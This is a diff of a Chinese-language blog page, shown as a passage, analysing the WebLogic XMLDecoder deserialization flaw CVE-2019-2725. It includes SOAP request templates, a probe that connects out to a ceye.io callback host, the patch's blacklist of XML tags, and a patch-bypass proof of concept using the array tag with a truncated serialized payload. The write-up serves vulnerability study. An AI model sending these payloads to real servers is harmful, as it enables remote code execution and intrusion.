+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span> <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">class</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>org.slf4j.ext.EventData<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">		XMLDecoder payload</span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PS 用于测试是否进行XMLDecoder反序列化以及是否可用class标签</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.net.Socket<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>xxx.ceye.io<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">int</span>&gt;</span>80<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-补丁"><a href="#4-2-补丁" class="headerlink" title="4.2 补丁"></a>4.2 补丁</h2><p>再次过滤<code>class</code>标签</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"class"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:class"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String attClass = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="keyword">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  String lengthString = attributes.getValue(<span class="string">"length"</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="keyword">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-CVE-2019-2725补丁绕过"><a href="#5-CVE-2019-2725补丁绕过" class="headerlink" title="5 CVE-2019-2725补丁绕过"></a>5 CVE-2019-2725补丁绕过</h1><p>补丁的绕过是针对使用JDK 1.6的，因为<code>JDK1.6</code>版本中的XMLDecoder处理方法都在<code>ObjectHandler</code>类中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, AttributeList var2)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">...</span><br><span class="line">        String var8 = (String)var3.get(<span class="string">"method"</span>);</span><br><span class="line">        <span class="keyword">if</span> (var8 == <span class="keyword">null</span> &amp;&amp; var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var8 = <span class="string">"new"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        var4.setMethodName(var8);</span><br><span class="line">     ...</span><br><span class="line">...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="string">"array"</span>) &#123;</span><br><span class="line">            var14 = (String)var3.get(<span class="string">"class"</span>);</span><br><span class="line">            Class var10 = var14 == <span class="keyword">null</span> ? Object.class : <span class="keyword">this</span>.classForName2(var14);</span><br><span class="line">            var11 = (String)var3.get(<span class="string">"length"</span>);</span><br><span class="line">            <span class="keyword">if</span> (var11 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4.setTarget(Array.class);</span><br><span class="line">                var4.addArg(var10);</span><br><span class="line">                var4.addArg(<span class="keyword">new</span> Integer(var11));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>mehotd</code>方法是所有标签都可以使用的了，<code>array</code>标签如果未定义<code>class</code>属性，默认赋值为<code>Object.class</code>。因此利用<code>array</code>标签来替代<code>class</code>标签<br>POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span> <span class="attr">method</span>=<span class="string">"forName"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span>&gt;</span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"byte"</span> <span class="attr">length</span>=<span class="string">"4522"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span> <span class="tag">&lt;<span class="name">byte</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">byte</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    ......</span><br><span class="line">                <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">WebLogic</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">XMLDecoder</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/22/weblogic-xmldecoder-20200322/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/sqli-join-20190910/" class="archive-article-date">
-  	<time datetime="2019-09-10T05:25:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/22/xmldecoder-20200322/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XMLDecoder代码执行原理</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/10/sqli-join-20190910/">JOIN绕过逗号以及列名过滤</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -278,9 +449,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
